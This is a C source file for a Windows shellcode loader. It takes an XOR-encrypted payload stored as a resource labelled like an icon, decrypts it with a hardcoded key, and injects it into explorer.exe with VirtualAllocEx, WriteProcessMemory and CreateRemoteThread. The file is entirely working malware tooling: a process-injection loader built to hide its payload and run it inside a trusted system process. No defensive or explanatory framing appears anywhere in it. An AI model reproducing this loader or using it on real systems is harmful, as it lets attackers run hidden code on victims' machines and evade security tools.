#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include "resources.h"





void DecryptXOR(char * encrypted_data, size_t data_length, char * key, size_t key_length) {
	int key_index = 0;
	
	for (int i = 0; i < data_length; i++) {
		if (key_index == key_length - 1) key_index = 0;

		encrypted_data[i] = encrypted_data[i] ^ key[key_index];
		key_index++;
	}
}

int SearchForProcess(const char *processName) {

    HANDLE hSnapshotOfProcesses;
    PROCESSENTRY32 processStruct;
    int pid = 0;
                
    hSnapshotOfProcesses = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hSnapshotOfProcesses) return 0;
                
    processStruct.dwSize = sizeof(PROCESSENTRY32); 
                
    if (!Process32First(hSnapshotOfProcesses, &processStruct)) {
        CloseHandle(hSnapshotOfProcesses);
        return 0;
    }
                
    while (Process32Next(hSnapshotOfProcesses, &processStruct)) {
		if (lstrcmpiA(processName, processStruct.szExeFile) == 0) {
            pid = processStruct.th32ProcessID;
            break;
                }
        }
                
    CloseHandle(hSnapshotOfProcesses);
                
    return pid;
}

int ShellcodeInject(HANDLE hProcess, unsigned char * shellcodePayload, unsigned int lengthOfShellcodePayload) {

    LPVOID pRemoteProcAllocMem = NULL;
	HANDLE hThread = NULL;

  
    pRemoteProcAllocMem = VirtualAllocEx(hProcess, NULL, lengthOfShellcodePayload, MEM_COMMIT, PAGE_EXECUTE_READ);
    WriteProcessMemory(hProcess, pRemoteProcAllocMem, (PVOID)shellcodePayload, (SIZE_T)lengthOfShellcodePayload, (SIZE_T *)NULL);
        //correcsnip
        //hThread = CreateRemoteThread(hProcess, NULL, 0, pRemoteProcAllocMem, NULL, 0, NULL);
	hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteProcAllocMem, NULL, 0, NULL);
	printf("CreateRemoteThread returned: 0x%p\n", hThread);
	


	if (hThread != NULL) {
        WaitForSingleObject(hThread, 500);
        CloseHandle(hThread);
        return 0;
        }
    return -1;
}


//int main(void) {
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)  {
    
	//void * alloc_mem;
	BOOL retval;
	HANDLE threadHandle;
    DWORD oldprotect = 0;
	HGLOBAL resHandle = NULL;
	HRSRC res;
    int pid = 0;
    HANDLE hProcess = NULL;
    unsigned int lengthOfShellcodePayload;

    unsigned char* shellcodePayload;

    char encryption_key[] = "!@#$(*)";
	unsigned char* decryptedPayload; // New pointer for decrypted data
	
	// Retrieve shellcode payload from resources section

	res = FindResource(NULL, MAKEINTRESOURCE(MY_ICON), RT_RCDATA);
	resHandle = LoadResource(NULL, res);
	shellcodePayload = (unsigned char *)LockResource(resHandle);
    lengthOfShellcodePayload = SizeofResource(NULL, res);

    // Decrypt retrieved shellcode
    DecryptXOR((char *)shellcodePayload, lengthOfShellcodePayload, encryption_key, sizeof(encryption_key));
	//decryptedPayload = new unsigned char[lengthOfShellcodePayload];
    //printf("\n[1] Press Enter to Decrypt XOR Payload\n");
    //getchar();

    //DecryptXOR((char*)shellcodePayload, lengthOfShellcodePayload, encryption_key, sizeof(encryption_key));
    pid = SearchForProcess("explorer.exe");

    if (pid) {
		//printf("explorer.exe PID = %d\n", pid);

		// try to open target process
		hProcess = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);

		if (hProcess != NULL) {
			ShellcodeInject(hProcess, shellcodePayload, lengthOfShellcodePayload);
			CloseHandle(hProcess);
		}
	}
	return 0;
}